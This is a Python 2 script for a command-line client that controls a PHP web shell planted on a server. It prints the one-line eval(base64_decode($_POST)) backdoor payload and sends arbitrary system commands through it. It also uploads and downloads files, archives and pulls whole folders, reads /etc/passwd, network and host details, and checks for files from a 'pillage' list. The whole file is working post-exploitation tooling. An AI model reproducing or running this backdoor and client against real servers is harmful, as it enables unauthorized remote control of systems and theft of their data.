
import base64
import httplib
from urlparse import urlparse
from cmd import Cmd
import os


class rshell(Cmd):

    pwd = ""
    old_pwd = ""

    def __init__(self, shell_url, proxy):
        Cmd.__init__(self)
        self.shell_url = shell_url
        self.proxy = proxy

    def do_help(self, line):
        print "help: Show this message"
        print "payload: show the shell code in php"
        print "download: download remotepath/remotefile localpath/localfile"
        print "upload: upload localpath/localfile remotepath/remotefile"
        print "compress_folder: compress_folder folder_path file.tar.gz"
        print "do_dwfolder: do_dwfolder folder_path"
        print "Or write a command to send to the server shell"
        return None

    def default(self, line):
        #This is the default command method
        #system function is called with the command to execute
        cmd = "system('{0}');".format(line)
        #doing the request to the server
        (code, response) = self.dorequest(cmd)
        if code == 200:
            print response

    def emptyline(self):
        print "Deja de darle al enter"

    def do_quit(self, line):
        #Return true to exit in postcmd
        return True

    def postcmd(self, stop, line):
        #This stop cmdloop if returns true
        #check if stop value is true
        #stop is the return value of do_* methods
        if stop:
            return True

    def do_exit(self, line):
        #Return true to exit in postcmd
        return True

    def dorequest(self, phpcmd):
        #Post request using the param parameter
        cmd_base64 = base64.encodestring(phpcmd)[:-1]
        fullurl = self.shell_url
        parsed_url = urlparse(fullurl)
        url = ''
        con = None
        params = "param={0}".format(cmd_base64)
        if self.proxy:
            (ip, port) = self.proxy.split(':')
            con = httplib.HTTPConnection(ip, int(port))
            url = fullurl
        else:
            url = parsed_url.path
            con = httplib.HTTPConnection(parsed_url.netloc, parsed_url.port)
        headers = {"Content-type": "application/x-www-form-urlencoded",
                   "Accept": "text/plain"}
        if con:
            con.request('POST', url, params, headers)
            response = con.getresponse()
            if response.status == 200:
                return (response.status, response.read())
            else:
                #
                return (response.status, None)
        else:
            #
            return (None, None)

    def do_shell(self, line):
        #This method execute the command locally
        print os.popen(line).read()
        return None

    def do_payload(self, line):
        self.print_payload()
        return None

    def do_phpinfo(self, line):
        #This is the default command method
        #system function is called with the command to execute
        s = "phpinfo();"
        #doing the request to the server
        self.dorequest(s)
        return None

    def print_payload(self):
        print "<?php eval(base64_decode($_POST['param'])); ?>"

    def do_download(self, line):
        files = line.split()
        #Return file contents encoded in base 64
        cmd = "echo base64_encode(file_get_contents('{0}'));".format(files[0])
        (code, data) = self.dorequest(cmd)
        if code == 200:
            f = file(os.path.basename(files[0]), "w")
            #Decode data and write it in a file
            f.write(base64.decodestring(data))
            f.close()
        else:
            print "Error"
        return None

    def do_upload(self, line):
        (filename, destination) = line.split()
        f = file(filename)
        fname = os.path.basename(filename)
        #Encode file data in base 64
        data = base64.encodestring(f.read()).replace("\n", "")
        f.close()
        #Building the command in remote server to decode base 64
        # and write the data in the file
        cmd = "file_put_contents('{0}/{1}',base64_decode('{2}'));"
        (code, data) = self.dorequest(cmd.format(destination, fname, data))
        if code == 200:
            print data
        else:
            print "Error"
        return None

    def do_compress_folder(self, line):
        (folder, archivo) = line.split()
        cmd = "tar -czf {0} {1}".format(archivo, folder)
        self.default(cmd)
        return None

    def do_dwfolder(self, line):
        if line[-1:] == "/":
            line = line[-1]
        filename = "{0}.tar.gz".format(os.path.basename(line))
        self.do_compress_folder("{0} {1}".format(line, filename))
        self.do_download("{0} {1}".format(filename, filename))
        return None

    def do_getsysinfo(self, line):
        #Print user and system information
        cmds = {"User name:": "whoami",
                "User id:": "id",
                "/etc/passwd:": "cat /etc/passwd",
                "/etc/issue:": "cat /etc/issue",
                "Host name:": "hostname -f",
                "System information (uname):": "uname -a",
                "Network iterfaces:": "ifconfig -a",
                "/etc/resolv.conf:": "cat /etc/resolv.conf",
                "Hosts ips information /etc/hosts:": "cat /etc/hosts",
                }
        for k, val in cmds.items():
            print "=" * 80
            print k
            print "-" * 80
            self.default(val)
        return None

    def do_getswversion(self, line):
        #Print some software versions
        cmds = {"gcc": "gcc --version",
                "mysql": "mysql --version",
                "perl": "perl -v Returns",
                "ruby": "ruby -v Returns",
                "python": "python --version",
                }
        print "=" * 80
        print "Software versions:"
        for k, val in cmds.items():
            print "-" * 80
            self.default(val)
        return None

    def file_exists(self, filename):
        cmd = "if (file_exists('{0}')) echo 1;".format(filename)
        (code, response) = self.dorequest(cmd)
        if code == 200:
            if response.replace("\n", "") == "1":
                print filename + " exist"
        else:
            print "Error"

    def do_check_files(self, line):
        filelist = file("pillage.lst")
        for filename in filelist:
            #Check filename, [:-1] to remove eol
            self.file_exists(filename[:-1])
        filelist.close()
        return None

#    def do_cd(self, line):
#        cmd = "cd ../; pwd"
#        self.default(cmd)
